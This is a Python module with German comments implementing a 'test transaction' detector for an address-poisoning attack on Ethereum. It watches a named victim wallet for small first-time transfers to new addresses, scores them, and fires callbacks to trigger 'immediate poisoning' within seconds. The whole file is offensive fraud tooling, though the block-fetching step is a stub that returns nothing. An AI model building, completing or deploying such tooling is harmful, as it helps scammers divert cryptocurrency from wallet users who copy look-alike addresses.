"""
Test-TX Detector - Erkennung von Test-Transactions für sofortiges Poisoning
Event Listener auf Blockchain, Confidence Score, < 60s Response Time
Basierend auf Chainalysis Research zu Test-Transaction Signals
"""

import asyncio
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from datetime import datetime, timedelta
from collections import deque
from modules.logger import Logger

logger = Logger("test_tx_detector")


@dataclass
class TestTransaction:
    """Test Transaction Detection"""
    tx_hash: str
    from_address: str
    to_address: str
    value: float  # ETH
    timestamp: datetime
    block_number: int
    confidence: float
    is_test: bool
    
    def to_dict(self) -> dict:
        return {
            'tx_hash': self.tx_hash,
            'from_address': self.from_address,
            'to_address': self.to_address,
            'value': self.value,
            'timestamp': self.timestamp.isoformat(),
            'block_number': self.block_number,
            'confidence': self.confidence,
            'is_test': self.is_test
        }


class TestTXDetector:
    """
    Test-TX Detector für sofortiges Poisoning
    
    Features:
    - Event Listener auf Blockchain für Test-TX
    - Confidence Score für Detection
    - Trigger für sofortiges Poisoning
    - < 60s Response Time
    - Adaptive Detection basierend auf Patterns
    """
    
    def __init__(self, rpc_connector):
        """
        Initialisiere Test-TX Detector
        
        Args:
            rpc_connector: RPC Connector für Blockchain Access
        """
        self.rpc_connector = rpc_connector
        self.monitored_addresses: Dict[str, List[TestTransaction]] = {}
        self.detection_callbacks: List[Callable] = []
        self.running = False
        self.monitor_task: Optional[asyncio.Task] = None
        
        # Test-TX Patterns (aus Chainalysis Research)
        self.test_patterns = {
            'min_value': 0.001,  # ETH
            'max_value': 0.1,    # ETH
            'typical_values': [0.001, 0.01, 0.05, 0.1],
            'time_window': timedelta(minutes=5)
        }
    
    def add_callback(self, callback: Callable):
        """
        Füge Callback für Test-TX Detection hinzu
        
        Args:
            callback: Callback Function (async def callback(test_tx: TestTransaction))
        """
        self.detection_callbacks.append(callback)
    
    async def start_monitoring(self, victim_address: str):
        """
        Starte Monitoring für Victim Address
        
        Args:
            victim_address: Victim Address
        """
        if victim_address not in self.monitored_addresses:
            self.monitored_addresses[victim_address] = deque(maxlen=100)
        
        self.running = True
        self.monitor_task = asyncio.create_task(self._monitor_loop(victim_address))
        logger.info(f"Test-TX Detector started for {victim_address[:10]}...")
    
    async def stop_monitoring(self, victim_address: str):
        """
        Stoppe Monitoring für Victim Address
        
        Args:
            victim_address: Victim Address
        """
        self.running = False
        if self.monitor_task:
            self.monitor_task.cancel()
            try:
                await self.monitor_task
            except asyncio.CancelledError:
                pass
        logger.info(f"Test-TX Detector stopped for {victim_address[:10]}...")
    
    async def _monitor_loop(self, victim_address: str):
        """Monitor Loop für Test-TX Detection"""
        while self.running:
            try:
                # Hole letzte Block Number
                block_number = await self.rpc_connector.get_block_number(1)
                
                # Hole Transaktionen in letztem Block
                transactions = await self._get_block_transactions(block_number, victim_address)
                
                # Prüfe auf Test-TX
                for tx in transactions:
                    test_tx = await self._analyze_transaction(tx, victim_address)
                    if test_tx.is_test:
                        # Trigger Callbacks
                        await self._trigger_detection(test_tx)
                        
                        # Speichere in History
                        self.monitored_addresses[victim_address].append(test_tx)
                
                # Warte auf nächsten Block
                await asyncio.sleep(12)  # Block Time ~12s
                
            except Exception as e:
                logger.error(f"Monitor Loop Error: {e}")
                await asyncio.sleep(30)
    
    async def _get_block_transactions(self, block_number: int, victim_address: str) -> List[Dict]:
        """
        Hole Transaktionen in Block für Victim Address
        
        Args:
            block_number: Block Number
            victim_address: Victim Address
            
        Returns:
            Liste von Transaktionen
        """
        # In echter Implementation: Web3.py eth_getBlockByNumber
        # Für Demo: Simuliert
        return []
    
    async def _analyze_transaction(self, tx: Dict, victim_address: str) -> TestTransaction:
        """
        Analysiere Transaktion auf Test-TX Pattern
        
        Args:
            tx: Transaktion
            victim_address: Victim Address
            
        Returns:
            TestTransaction
        """
        # Extrahiere Daten
        tx_hash = tx.get('hash', '')
        from_address = tx.get('from', '')
        to_address = tx.get('to', '')
        value = float(tx.get('value', 0)) / 1e18  # Wei to ETH
        timestamp = datetime.fromtimestamp(tx.get('timestamp', 0))
        block_number = tx.get('blockNumber', 0)
        
        # Prüfe auf Test-TX Pattern
        is_test = self._is_test_transaction(value, from_address, to_address, victim_address)
        confidence = self._calculate_confidence(value, from_address, to_address, victim_address)
        
        return TestTransaction(
            tx_hash=tx_hash,
            from_address=from_address,
            to_address=to_address,
            value=value,
            timestamp=timestamp,
            block_number=block_number,
            confidence=confidence,
            is_test=is_test
        )
    
    def _is_test_transaction(self, value: float, from_address: str, to_address: str, victim_address: str) -> bool:
        """
        Prüfe ob Transaktion Test-TX ist
        
        Args:
            value: Transaction Value (ETH)
            from_address: From Address
            to_address: To Address
            victim_address: Victim Address
            
        Returns:
            True wenn Test-TX
        """
        # Test-TX Pattern:
        # 1. Kleine Value (0.001 - 0.1 ETH)
        # 2. Von Victim zu bekannter Adresse
        # 3. Innerhalb von Zeitfenster
        
        if value < self.test_patterns['min_value'] or value > self.test_patterns['max_value']:
            return False
        
        if from_address != victim_address:
            return False
        
        # Prüfe ob to_address in letzten Transaktionen
        recent_txs = self.monitored_addresses.get(victim_address, [])
        for recent_tx in recent_txs:
            if recent_tx.to_address == to_address:
                # Bereits gesehen - nicht Test-TX
                return False
        
        return True
    
    def _calculate_confidence(self, value: float, from_address: str, to_address: str, victim_address: str) -> float:
        """
        Berechne Confidence Score für Test-TX Detection
        
        Args:
            value: Transaction Value
            from_address: From Address
            to_address: To Address
            victim_address: Victim Address
            
        Returns:
            Confidence Score (0-1)
        """
        confidence = 0.0
        
        # Value Pattern (0.001, 0.01, 0.05, 0.1)
        if value in self.test_patterns['typical_values']:
            confidence += 0.3
        elif value < 0.05:
            confidence += 0.2
        elif value < 0.1:
            confidence += 0.1
        
        # From Victim
        if from_address == victim_address:
            confidence += 0.2
        
        # New Address (nicht in History)
        recent_txs = self.monitored_addresses.get(victim_address, [])
        is_new_address = all(tx.to_address != to_address for tx in recent_txs)
        if is_new_address:
            confidence += 0.3
        
        # Time-based Confidence
        if confidence > 0.5:
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    async def _trigger_detection(self, test_tx: TestTransaction):
        """
        Trigger Test-TX Detection Callbacks
        
        Args:
            test_tx: Detected Test Transaction
        """
        logger.warning(f"Test-TX detected: {test_tx.tx_hash[:10]}... (Confidence: {test_tx.confidence:.2f})")
        
        for callback in self.detection_callbacks:
            try:
                await callback(test_tx)
            except Exception as e:
                logger.error(f"Callback Error: {e}")
    
    def get_detection_history(self, victim_address: str) -> List[TestTransaction]:
        """
        Hole Detection History für Victim Address
        
        Args:
            victim_address: Victim Address
            
        Returns:
            Liste von Test Transactions
        """
        return list(self.monitored_addresses.get(victim_address, []))


# Beispiel-Usage
async def main():
    from modules.rpc_connector import RPCConnector, RPCProvider
    
    # Erstelle RPC Connector
    providers = [
        RPCProvider(
            name="LlamaNodes",
            url="https://sepolia.llamarpc.com",
            chain_id=11155111,
            priority=1
        )
    ]
    connector = RPCConnector(providers)
    
    # Erstelle Test-TX Detector
    detector = TestTXDetector(connector)
    
    # Füge Callback hinzu
    async def on_test_tx(test_tx: TestTransaction):
        print(f"✅ Callback triggered: {test_tx.tx_hash[:10]}...")
    
    detector.add_callback(on_test_tx)
    
    # Starte Monitoring
    await detector.start_monitoring("0x1234567890123456789012345678901234567890")
    
    # Warte für Detection
    await asyncio.sleep(60)
    
    # Hole History
    history = detector.get_detection_history("0x1234567890123456789012345678901234567890")
    print(f"✅ Detection History: {len(history)} transactions")
    
    # Stoppe Monitoring
    await detector.stop_monitoring("0x1234567890123456789012345678901234567890")


if __name__ == "__main__":
    asyncio.run(main())